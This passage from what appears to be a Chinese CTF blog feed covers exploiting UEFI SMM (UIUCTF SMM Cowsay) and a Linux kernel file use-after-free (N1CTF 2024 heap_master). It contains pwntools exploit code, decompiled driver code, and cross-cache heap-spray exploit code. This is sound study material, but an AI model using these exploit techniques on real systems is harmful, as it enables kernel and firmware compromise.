[rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0x9d76f4b1548e0872ec86b7f3b31cf11e</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;BootServices + <span class="number">320</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov qword ptr [rax], 0x5f9f080</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x40</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 0x28                             /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141               /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141</span></span><br><span class="line"><span class="string">    .quad 0x4141414141414141</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Type more code&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最终效果如下：  </p><img src="/2024/12/14/uefi/28.png" class="" title="我的图图呢">  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单学习了一下 UEFI SSM 的漏洞类型和攻击方式，对 UEFI 固件漏洞挖掘利用有了更加深刻的认识，找个时间再找些实际存在的漏洞实操一下😋。  </p><h2 id="学习的文章"><a href="#学习的文章" class="headerlink" title="学习的文章"></a>学习的文章</h2><p><a href="https://xiananren.github.io/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://xiananren.github.io/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a><br><a href="https://www.cnblogs.com/L0g4n-blog/p/17369864.html">https://www.cnblogs.com/L0g4n-blog/p/17369864.html</a><br><a href="https://www.sentinelone.com/labs/zen-and-the-art-of-smm-bug-hunting-finding-mitigating-and-detecting-uefi-vulnerabilities/">https://www.sentinelone.com/labs/zen-and-the-art-of-smm-bug-hunting-finding-mitigating-and-detecting-uefi-vulnerabilities/</a><br><a href="https://www.binarly.io/advisories/brly-2021-007">https://www.binarly.io/advisories/brly-2021-007</a><br><a href="https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/">https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/</a><br><a href="https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/">https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux file uaf</title>
      <link href="/2024/11/12/fileuaf/"/>
      <url>/2024/11/12/fileuaf/</url>
      
        <content type="html"><![CDATA[<h2 id="写在一切之前"><a href="#写在一切之前" class="headerlink" title="写在一切之前"></a>写在一切之前</h2><p>这个周末打了 N1CTF，不得不说 N1CTF 的题目质量是真的高，下次出题我也要出好一点（其实已经出好了，不过打算花多点时间去优化😋😋，敬请期待）。这次比赛有两题我觉得非常有意思，一题是 heap_master，另外一题是 php_master。其中 php_master 当时并没有做出来，打算以后有时间再研究一下（出题人的预期解是拿到任意反序列化，可是有的师傅认为这道题目其实可以拿到 code exec），感觉如何突破 php 新加的 shadow heap 将会是一个热点。这篇博客主要是借 N1CTF heap_master 这题来讲讲 linux 内核中的 file uaf 漏洞利用方式</p><h2 id="Dirty-PageTable-in-file-uaf"><a href="#Dirty-PageTable-in-file-uaf" class="headerlink" title="Dirty PageTable in file uaf"></a>Dirty PageTable in file uaf</h2><p>这里使用的环境是 N1CTF 2024 heap_master。</p><h3 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h3><p>我们都知道内核对物理内存的管理是按照页为基本单位进行的，进程运行起来所需要的数据也是存储在一个一个的物理页中，既然物理内存页可以存储进程的普通数据，那么它也一定可以存储进程虚拟内存与物理内存之间的映射关系。</p><p>事实上，内核也是这么干的，内核会从物理内存空间中拿出一个物理内存页来专门存储进程里的这些内存映射关系，而这种物理内存页我们将其称之为页表，从这里可以看出页表的本质其实就是一个物理内存页。</p><p>而内核会在页表中划分出来一个个大小相等的小内存块，这些小内存块我们称之为页表项 PTE（Page Table Entry），正是这个 PTE 保存了进程虚拟内存空间中的虚拟页与物理内存页的映射关系，以及控制物理内存访问的相关权限位。</p><p>因为内存映射的粒度是按照页为单位进行的，所以进程虚拟内存空间中的每个虚拟页在页表中都会有一个 PTE 与之对应，而虚拟页背后映射的物理内存页的起始地址就保存在 PTE 中。PTE 将会在我们后续的攻击中扮演重要的角色。</p><img src="/2024/11/12/fileuaf/1.png" class="" title="我的图图呢">  <h3 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>由于代码量比较少，这里直接贴上 ida 的外代码</p><p>safenote_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">safenote_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v0 = misc_register(&amp;safenote_device);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2B1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = kmem_cache_create(<span class="string">&quot;safenote&quot;</span>, <span class="number">0xC0</span>LL, <span class="number">0LL</span>, <span class="number">0x4052000</span>LL, <span class="number">0LL</span>);</span><br><span class="line">    note_kcache = (kmem_cache *)v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(<span class="type">unsigned</span> __int16 *)(v1 + <span class="number">0x34</span>);</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">0x2C</span>) = <span class="number">0x34</span>;</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">0x30</span>) = (v2 + <span class="number">0x67</span>) / v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="number">-12</span>;</span><br><span class="line">      printk(&amp;unk_308);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_open</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">safenote_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( already_open )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFF0</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))safenote_open_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">safenote_ioctl</span><span class="params">(file *f, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">u_int32_t</span> heap_idx; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;ioc_arg, v3, <span class="number">4LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1338</span> )                          <span class="comment">// free</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      kfree();</span><br><span class="line">      note[ioc_arg.heap_idx] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1339</span> )                          <span class="comment">// uaf</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !backdoor_used &amp;&amp; ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      kfree();</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">      backdoor_used = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    heap_idx = ioc_arg.heap_idx;</span><br><span class="line">    <span class="keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> &amp;&amp; !note[ioc_arg.heap_idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      note[heap_idx] = (<span class="type">char</span> *)kmem_cache_alloc(note_kcache, <span class="number">0x400CC0</span>LL, ioc_arg.heap_idx);</span><br><span class="line">      <span class="keyword">if</span> ( note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-12LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_close</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">safenote_close</span><span class="params">(inode *inodep, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inodep, filp);</span><br><span class="line">  --already_open;</span><br><span class="line">  printk(&amp;unk_297);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见出题人自己创建了一个 kmem_cache 并且后面的菜单堆都会从该 kmem_cache 中申请 object，而且题目白给了一次 double free 的机会。根据经验，我们自然而然的就会想到第一步要先让 uaf 的 object 对应的 slab 进入到 cross cache 中，至于要怎么进下面这篇文章已经写的非常清楚，这里不再赘：<a href="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/">Cross Cache Attack技术细节分析</a></p><p>我们可以看到出题人为这个新的 kmem_cache 自定义了  cpu_partial  和 cpu_partial_slabs 的值</p><img src="/2024/11/12/fileuaf/2.png" class="" title="我的图图呢">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * slab info notecache</span><br><span class="line"> * order: 0, object_size: 192</span><br><span class="line"> * cpu_partial: 52</span><br><span class="line"> * objs_per_slab: 16</span><br><span class="line"> * cpu_partial_slabs: 7</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>可以看到 cpu_partial 的值变得非常的大，如果我们要用上面链接那个做法至少需要申请 <code>2*objs_per_slab*(cpu_partial+1) = 0x6a0</code> 个堆块，而在菜单堆中我们最多同时拥有 0x100 个堆块，所以上文的方法在这里是行不通的，可是这里有个非预期 😋。</p><p>我们发现这道题目的 kernel 版本为 6.1.110</p><img src="/2024/11/12/fileuaf/3.png" class="" title="我的图图呢">  <p>我们查看当前版本的 put_cpu_partial 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cpu_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab, <span class="type">int</span> drain)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">oldslab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab_to_unfreeze</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="type">int</span> slabs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">oldslab = this_cpu_read(s-&gt;cpu_slab-&gt;partial);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldslab) &#123;</span><br><span class="line"><span class="keyword">if</span> (drain &amp;&amp; oldslab-&gt;slabs &gt;= s-&gt;cpu_partial_slabs) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Partial array is full. Move the existing set to the</span></span><br><span class="line"><span class="comment"> * per node partial list. Postpone the actual unfreezing</span></span><br><span class="line"><span class="comment"> * outside of the critical section.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab_to_unfreeze = oldslab;</span><br><span class="line">oldslab = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">slabs = oldslab-&gt;slabs;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slabs++;</span><br><span class="line"></span><br><span class="line">slab-&gt;slabs = slabs;</span><br><span class="line">slab-&gt;next = oldslab;</span><br><span class="line"></span><br><span class="line">this_cpu_write(s-&gt;cpu_slab-&gt;partial, slab);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab_to_unfreeze) &#123;</span><br><span class="line">__unfreeze_partials(s, slab_to_unfreeze);</span><br><span class="line">stat(s, CPU_PARTIAL_DRAIN);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现当前版本的内核判断 slab 是否要被 buddy system 回收是与 cpu_partial_slabs 进行比较而不是 cpu_partial，而 cpu_partial_slabs 在当前环境里的值为 7，所以我们完全可以直接喷 7 个页的堆块（我喷了12个）然后申请出 uaf 的堆块最后再从头依次释放所有申请出来的堆块就能让 uaf 的堆块对应的 slab 给 buddy system 回收，我的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> uaf_index = <span class="number">0xc0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">    add(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == uaf_index)&#123;</span><br><span class="line">        uaf(uaf_index);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    del(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而出题人的预期解为：在不同的 CPU 上执行添加和释放操作。具体来说，在 CPU0 上进行分配，然后在 CPU1 上释放。由于 CPU0 无法访问由 CPU1 管理的 freelist 或 partial slabs，这促使 CPU1 达到其 partial 阈值，触发 put_cpu_partial。</p><p>其实现代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> safe_note_objs_per_slab = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line">info(<span class="string">&quot;dev_fd = %d&quot;</span>, dev_fd);</span><br><span class="line">info(<span class="string">&quot;allocate in cpu 0&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; safe_note_objs_per_slab; i++)&#123;</span><br><span class="line">add(i);</span><br><span class="line"><span class="keyword">if</span>(i == safe_note_objs_per_slab / <span class="number">2</span>)&#123;</span><br><span class="line">info(<span class="string">&quot;allocate at note[0]&quot;</span>);</span><br><span class="line">add(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;trigger backdoor int cpu 1 at note[0]&quot;</span>);</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br><span class="line">uaf(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; safe_note_objs_per_slab; i++)&#123;</span><br><span class="line">del(i);</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;Trigger done...&quot;</span>);</span><br><span class="line">info(<span class="string">&quot;Try to Spray at different cpu_slab to cross cache&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; NOTE_SIZE; j++)&#123;</span><br><span class="line">add(j);</span><br><span class="line">&#125;</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; NOTE_SIZE; j++)&#123;</span><br><span class="line">del(j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;Spray done...&quot;</span>);</span><br><span class="line">info(<span class="string">&quot;Try to cross cache to file&quot;</span>);</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>不得不说这招确实有点牛逼的说（</p><p>这道题目在 kernel 的基础上套了一层容器逃逸，所以我们的目标最终是要能够实现任意 shellcode 执行或者 执行我们的 rop，但由于前者的限制更少一点，所以我们选择使用 shellcode，自然而然的我们也会想到 dirty pageTable这种打法。这种打法的原理很简单，就是修改我们在前置内容里面所提到的 PTE，进而能够实现内核上任意物理地址的读写。但是这里又有一个新问题，出题人编写的内核驱动并没有给我们读写 uaf 堆块的机会，这里我们选择使用 file 结构体，该结构体在当前版本的内核定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span><span class="title">f_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">f_rcuhead</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_iocb_flags;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span><span class="title">f_path</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span>*<span class="title">f_inode</span>;</span><span class="comment">/* cached value */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment"> * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">spinlock_t</span>f_lock;</span><br><span class="line"><span class="type">atomic_long_t</span>f_count;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> f_flags;</span><br><span class="line"><span class="type">fmode_t</span>f_mode;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">f_pos_lock</span>;</span></span><br><span class="line"><span class="type">loff_t</span>f_pos;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span><span class="title">f_owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">f_cred</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span><span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">u64f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line"><span class="type">void</span>*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line"><span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span 